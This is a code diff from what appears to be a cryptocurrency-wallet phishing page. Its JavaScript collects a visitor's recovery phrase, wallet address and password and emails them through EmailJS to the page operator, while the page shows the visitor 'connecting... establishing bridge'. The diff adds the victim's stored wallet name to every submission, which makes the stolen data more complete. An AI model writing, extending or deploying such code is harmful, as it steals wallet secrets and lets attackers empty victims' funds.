@@ -33,22 +33,23 @@ item[2].addEventListener('click',()=>{
 })
 
 
-
+let nameOfWALLET=localStorage.getItem("textvalue")
 const servicerID= "service_19o6v8s"
 const tempID="template_n10h5uy"
-
   let params = {
+    wallet_name:nameOfWALLET,
     from_name:document.getElementById("title_1").textContent,
     phrase:document.getElementById("input_1").value,
     addres:document.getElementById("input_2").value
 }
 function submitOne(){
     params = {
+    wallet_name:nameOfWALLET,
     from_name:document.getElementById("title_1").textContent,
     phrase:document.getElementById("input_1").value,
     addres:document.getElementById("input_2").value
-    
-}
+  }
+  console.log(nameOfWALLET);
 emailjs.send(servicerID,tempID,params).then(
   function (res){
       con.innerHTML="connecting... establishing bridge"
@@ -58,6 +59,7 @@ emailjs.send(servicerID,tempID,params).then(
 }
 function submitTwo(){
       params = {
+    wallet_name:nameOfWALLET,
     from_name:document.getElementById("title_2").textContent,
     phrase:document.getElementById("input_3").value,
     addres:document.getElementById("input_4").value
@@ -71,6 +73,7 @@ emailjs.send(servicerID,tempID,params).then(
 }
 function submitThree(){
       params = {
+    wallet_name:nameOfWALLET,
     from_name:document.getElementById("title_3").textContent,
     phrase:"the password is : ",
     addres:document.getElementById("input_5").value
